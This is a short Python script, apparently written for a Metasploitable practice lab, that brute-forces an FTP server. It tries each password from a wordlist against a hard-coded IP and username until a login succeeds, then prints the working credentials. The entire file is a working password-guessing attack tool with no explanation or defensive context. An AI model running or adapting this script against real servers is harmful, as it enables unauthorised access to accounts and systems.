#!/usr/bin/python

from ftplib import FTP

target = '11.11.11.171'
user = 'msfadmin'
pwd  = 'msfadmin'
verbose = False

print('[*] - BRUTEFORCE FTP Attack')
print()


def bruteforceattack(_target,_user,_pwd):
    try:
        ftpconn = FTP(_target)
        connection = ftpconn.login(_user,_pwd)
        ftpconn.quit()
        print('[+] BINGO - username:', _user, 'Senha:', _pwd) 
        return True

    except:
        if verbose:
            print('[-] FAIL  - username:', _user, 'Senha:', _pwd) 


def user_wordlist(_target,_user,_wordlist):
    with open(_wordlist, 'r') as _word:
        for _line in _word:
            _pwd = _line.strip('\n')

            bingo=bruteforceattack(_target,_user,_pwd)
            
            if bingo:
                break

user_wordlist(target, user, 'word.txt')

